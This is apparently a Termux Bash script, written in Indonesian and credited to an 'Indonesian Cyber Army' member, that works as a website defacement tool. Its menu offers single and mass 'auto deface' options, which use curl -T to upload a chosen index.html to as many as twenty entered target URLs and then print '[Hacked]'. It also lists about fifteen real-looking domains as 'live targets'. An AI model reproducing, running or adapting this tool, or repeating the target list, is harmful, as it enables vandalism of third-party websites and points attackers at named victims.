#Gila_coding
green="\033[32;1m"
yellow="\033[33;1m"
indigo="\033[34;1m"
red="\033[35;1m"
purple="\033[37;1m"
cyan="\033[36;1m"
white="\033[39;1m"
pkg install toilet -y
bash jr.sh
echo
echo  $green
echo "Loading.............";
sleep 0.1;
clear
echo  $green
echo 'Harap Sabar.........................';
sleep 0.1;
clear
echo  $green
echo 'Loading.................';
sleep 0.1;
clear
echo  $red
echo 'Harap Sabar............................................';
sleep 0.4;
echo  $green
echo "Loading..................................";
sleep 0.1;
clear
echo  $green
echo  'Harap Sabar...............';
sleep 0.1;
clear
echo  $green
echo 'Loading................................................';
sleep 0.1;
clear
echo  $red
echo 'Harap Sabar...........................';
sleep 0.1;
echo  $green
echo "Loading.........................................";
sleep 0.1;
clear
echo  $green
echo 'Harap Sabar....................................................';
sleep 0.1;
clear
echo  $green
echo 'Loading................................';
sleep 0.1;
clear
echo  $red
echo 'Harap Sabar............................................';
sleep 0.1;
echo  $green
echo "Loading.....................................";
sleep 0.1;
clear
echo  $green
echo 'Harap Sabar.............................';
sleep 0.1;
clear
echo  $green
echo 'Loading........................................................';
sleep 0.1;
clear
echo  $red
echo 'Harap Sabar........................';
sleep 0.1;
clear
echo  $green
echo "Loading.............................................";
sleep 0.1;
clear
echo  $green
echo 'Harap Sabar................';
sleep 0.1;
clear
echo  $green
echo 'Loading.................................';
sleep 0.1;
clear
echo  $red
echo 'Harap Sabar...................................................';
sleep 0.4;
echo  $green
echo "Loading....................................";
sleep 0.1;
clear
echo  $green
echo "Loading.............................................";
sleep 0.1;
clear
echo  $green
echo 'Harap Sabar................';
sleep 0.1;
clear
echo  $green
echo 'Loading.................................';
sleep 0.1;
clear
echo  $red
echo 'Harap Sabar...................................................';
sleep 0.4;
echo  $green
echo "Loading....................................";
sleep 0.1;
clear
echo
echo
echo
echo
echo
echo
echo
toilet -f future "    Defacer Tools" | lolcat
echo
echo $red"##########################$green" WELCOME "$red###########################"
echo $yellow
figlet -f future "Indonesian Cyber Army"
echo
echo $red"##########################$green" WELCOME "$red###########################"
echo
echo $indigo"	~"$cyan"{"$white"A"$cyan"}"$green"."$yellow"Tebas Index"$cyan
echo $indigo"        ~"$cyan"{"$white"B"$cyan"}"$green"."$yellow"Web Scan"$cyan
echo $indigo"	~"$cyan"{"$white"C"$cyan"}"$green"."$yellow"Auto Deface"$cyan
echo
echo $cyan"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
echo
echo $indigo"  +"$cyan"{"$white"T"$cyan"}"$purple"."$green"TUTORIAL & LIVE TARGET"$indigo"      +"$cyan"{"$white"I"$cyan"}"$green"Info"$indigo"      +"$cyan"{"$white"Q"$cyan"}"$green"Quit"$cyan
echo $cyan"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
echo $indigo"=============================================================="
echo
echo $white "╭─"$yellow"Chemod@zrd404"$cyan" ~/IndoCyber"$white
read -p " ╰─$ "  apaan
echo
if [ $apaan = "A" ] || [ $apaan = "a" ]
then
echo
echo
echo
clear
echo
echo
echo
echo
toilet -f future "Deface Tebas Index" | lolcat
echo
echo $red "Simpan SC Di Memory Internal Di Luar Folder "
echo
echo $yellow "Live Target"
echo $white "http://contsol.co.za"
echo $cyan "http://colourfactory.co.za"
echo $white "http://chillibitez.co.za"
echo $cyan "http://chasingfantasia.com"
echo $white "http://centraltech.co.za"
echo $cyan "http://cblandscapes.co.za"
echo $white "http://crimsonmonkeyweb.com"
echo $cyan "http://kevinbutho.com"
echo $white "http://prorepafrica.com"
echo $cyan "http://xposurephotography.co.za"
echo $white "http://windmillsandporcupines.co.za"
echo $cyan "http://tcnig.co.za"
echo $white "http://techdirect.co.za"
echo $cyan "http://thehellenic.co.za"
echo $white "http://valdicare.co.za"
echo
echo $red "Eksekusi Taarget!!!"
echo $green "╭─"$blue"Chemod@zrd404"$cyan" ~/IndoCyber"$white
read -p " ╰─$ "  target
echo
echo $red "Masukan Script!!! "
echo $green "╭─"$blue"Chemod@zrd404"$cyan" ~/Nama SC Harus(index.html)"$white
read -p " ╰─$ "  script
curl -T /storage/emulated/0/$script $target
echo $red "["$yellow"Hacked"$red"]"$cyan"～～～＞"$green" $target"
echo
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
read -p "[B/Q] : " back
fi

if [ $apaan = "B" ] || [ $apaan = "b" ]
then
echo
echo
echo
clear
echo
echo
echo
cd Files
php kamu.php
echo
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
read -p "[B/Q] : " back
fi

if [ $apaan = "C" ] || [ $apaan = "c" ]
then
echo
echo
echo
clear
echo
echo
echo
echo $red
toilet -f future "Auto Deface 20" | lolcat
echo $cyan "Deface Masal Sebanyak 20 Web"
echo
echo $red"###"$blue" ctrl + c to quit"$red" ###"
echo
echo
echo
echo "Masukan Script !!!!"
echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white                               
read -p " ╰─$ " script
echo
echo
echo $white"Masukan Target1 !!!!"
echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
read -p " ╰─$ " target1
curl -T /storage/emulated/0/$script $target1
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target1/$script"
echo
echo $white"Masukan Target2 !!!!"
echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
read -p " ╰─$ " target2
curl -T /storage/emulated/0/$script $target2
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target2/$script"
echo
echo $white"Masukan Target3 !!!!"
echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
read -p " ╰─$ " target3
curl -T /storage/emulated/0/$script $target3
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target3/$script"
echo
echo $white"Masukan Target4 !!!!"
echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
read -p " ╰─$ " target4
curl -T /storage/emulated/0/$script $target4
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target4/$script"
echo
echo $white"Masukan Target5 !!!!"
echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
read -p " ╰─$ " target5
curl -T /storage/emulated/0/$script $target5
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target5/$script"
echo
echo $white"Masukan Target6 !!!!"
echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
read -p " ╰─$ " target6
curl -T /storage/emulated/0/$script $target6
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target6/$script"
echo
echo $white"Masukan Target7 !!!!"
echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
read -p " ╰─$ " target7
curl -T /storage/emulated/0/$script $target7
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target7/$script"
echo
echo $white"Masukan Target8 !!!!"
echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
read -p " ╰─$ " target8
curl -T /storage/emulated/0/$script $target8
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target8/$script"
echo
echo $white"Masukan Target9 !!!!"
echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
read -p " ╰─$ " target9
curl -T /storage/emulated/0/$script $target9
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target9/$script"
echo
echo $white"Masukan Target10 !!!! "
echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
read -p " ╰─$ " target10
curl -T /storage/emulated/0/$script $target10
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target10/$script"
echo
echo $white"Masukan Target11 !!!! "
echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
read -p " ╰─$ " target11
curl -T /storage/emulated/0/$script $target11
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target11/$script"
echo
echo $white"Masukan Target12 !!!! "
echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
read -p " ╰─$ " target12
curl -T /storage/emulated/0/$script $target12
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target12/$script"
echo
echo $white"Masukan Target13 !!!! "
echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
read -p " ╰─$ " target13
curl -T /storage/emulated/0/$script $target13
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target13/$script"
echo
echo $white"Masukan Target14 !!!! "
echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
read -p " ╰─$ " target14
curl -T /storage/emulated/0/$script $target14
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target14/$script"
echo
echo $white"Masukan Target15 !!!! "
echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
read -p " ╰─$ " target15
curl -T /storage/emulated/0/$script $target15
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target15/$script"
echo
echo $white"Masukan Target16 !!!! "
echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
read -p " ╰─$ " target16
curl -T /storage/emulated/0/$script $target16
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target16/$script"
echo
echo $white"Masukan Target17 !!!! "
echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
read -p " ╰─$ " target17
curl -T /storage/emulated/0/$script $target17
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target17/$script"
echo
echo $white"Masukan Target18 !!!! "
echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
read -p " ╰─$ " target18
curl -T /storage/emulated/0/$script $target18
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target18/$script"
echo
echo $white"Masukan Target19 !!!! "
echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
read -p " ╰─$ " target19
curl -T /storage/emulated/0/$script $target19
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target19/$script"
echo
echo $white"Masukan Target20 !!!! "
echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
read -p " ╰─$ " target20
curl -T /storage/emulated/0/$script $target20
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target20/$script"
echo
echo
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
read -p "[B/Q] : " back
fi

if [ $apaan = "I" ] || [ $apaan = "i" ]
then
echo
echo
echo
clear
echo
echo
echo
echo
toilet -f future "   Informasi Tools" | lolcat
echo $red"##########################$green" WELCOME "$red###########################"
echo $green"Author  : Chemod_zrd404			"
echo $purple"Gthub   : https://github.com/21D4N404"
echo $white"Blog    : http://generasicyberindo.blogspot.com"
echo
echo $yellow"                          THANKS TO :"
echo
echo $cyan"[+] MR.NAGON_TA7 & KOKO "
echo $cyan"[+] MR.W3B_XIT "
echo $cyan"[+] MR.L3RBI & All Member [I.C.A] "
echo $red"##########################$green" WELCOME "$red###########################"
echo $indigo"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
echo
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
read -p "[B/Q] " back
fi

if [ $apaan = "T" ] || [ $apaan = "t" ]
then
cat tutorial.txt
echo
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
read -p "[B/Q] " back
fi

if [ $apaan = "Q" ] || [ $apaan = "q" ]
then
echo " Terimakasih Sudah Menggunakan Tools Kami :) "
exit
clear
fi


if [ $back = "B" ] || [ $back = "b" ]
then
sh ICA.sh
fi

if [ $back = "Q" ] || [ $back = "q" ]
then
clear
fi
